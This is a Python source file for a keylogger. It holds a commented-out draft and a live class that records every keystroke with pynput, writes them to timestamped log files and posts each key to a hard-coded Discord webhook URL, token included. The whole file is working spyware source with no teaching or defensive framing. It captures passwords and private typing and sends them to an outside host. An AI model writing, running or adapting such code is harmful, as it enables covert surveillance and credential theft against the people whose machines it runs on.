# from pynput.keyboard import Key, Listener
# from dhooks import Webhook 
# from cryptography.fernet import Fernet
# import ctypes
# import os 
    
# log_dir = ' '

# log_send = Webhook('https://discord.com/api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9')

# output_file= "keylog.txt"

# def on_press(key):
#     try: 
#         with open(output_file, 'a') as file:
#             file.write(key.char)
#             log_send.send(str(key))
#     except AttributeError:
#         with open(output_file,'a') as file:
#             file.write(f'[{str(key)}]')
#             log_send.send(f'{key}')
    
# with Listener(on_press=on_press) as listener:
#     listener.join()


from pynput.keyboard import Key, Listener
import logging
import os
from datetime import datetime
import requests

class Keylogger:

    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd, sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)

    def send_to_discord(self, message):
        # Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
        webhook_url = 'https://discord.com/api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9'
        payload = {'content': message}
        requests.post(webhook_url, data=payload)

    def on_press(self, key):
        try:
            key_str = str(key)
            logging.info(key_str)
            # Send the key to Discord
            self.send_to_discord(key_str)
        except Exception as e:
            logging.error(e)

    def write_log_file(self):
        # time format example: '2021-05-29-171747'
        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")

        # logging info in the file
        logging.basicConfig(
            filename=(os.path.join(self.log_dir, time) + "-log.txt"),
            level=logging.DEBUG,
            format='[%(asctime)s]: %(message)s',
        )

        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()




